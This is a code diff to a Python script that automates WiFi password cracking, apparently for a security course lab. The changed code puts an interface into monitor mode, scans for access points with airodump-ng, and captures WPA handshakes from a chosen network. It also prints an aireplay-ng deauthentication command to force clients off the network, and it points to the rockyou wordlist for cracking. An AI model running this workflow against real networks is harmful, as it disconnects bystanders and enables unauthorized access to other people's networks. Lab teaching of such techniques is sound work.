@@ -46,7 +46,7 @@ console = Console()
 CFG = {
     "wifi": {
         "interface":    "wlan0",
-        "monitor_iface":"wlan0mon",
+        "monitor_iface":"wlan0",
         "wordlist":     "/usr/share/wordlists/rockyou.txt",
         "capture_file": "/tmp/incs4810_capture",
     },
@@ -526,16 +526,17 @@ def phase1_wifi_crack() -> PhaseResult:
     mon   = CFG["wifi"]["monitor_iface"]
     wl    = _resolve_wordlist(CFG["wifi"]["wordlist"])
 
-    # ── Monitor mode ──────────────────────────────────────────────────────────
-    ok("Enabling monitor mode...")
-    run_cmd("sudo airmon-ng check kill", capture=False)
-    run_cmd(f"sudo airmon-ng start {iface}", capture=False)
+    # ── Monitor mode (native kernel — no airmon-ng rename quirks) ────────────
+    ok(f"Putting {iface} into monitor mode...")
+    run_cmd(f"sudo ifconfig {iface} down",          capture=False)
+    run_cmd(f"sudo iwconfig {iface} mode monitor",  capture=False)
+    run_cmd(f"sudo ifconfig {iface} up",            capture=False)
 
     # ── Interactive AP scan ───────────────────────────────────────────────────
     scan_csv = "/tmp/incs4810_scan"
     info("Scanning for APs (12 s) — please wait...")
     run_cmd(
-        f"sudo timeout 12 airodump-ng --output-format csv -w {scan_csv} {mon} 2>/dev/null",
+        f"sudo timeout 12 airodump-ng --output-format csv -w {scan_csv} {iface} 2>/dev/null",
         timeout=18, capture=False,
     )
 
@@ -577,9 +578,9 @@ def phase1_wifi_crack() -> PhaseResult:
     # ── Handshake capture + crack loop ────────────────────────────────────────
     while True:
         ok(f"Capturing handshake on CH {channel} (60 s)...")
-        warn(f"Run deauth in another terminal: sudo aireplay-ng --deauth 10 -a {bssid} {mon}")
+        warn(f"Run deauth in another terminal: sudo aireplay-ng --deauth 10 -a {bssid} {iface}")
         run_cmd(
-            f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon} 2>/dev/null",
+            f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {iface} 2>/dev/null",
             timeout=75, capture=False,
         )
 
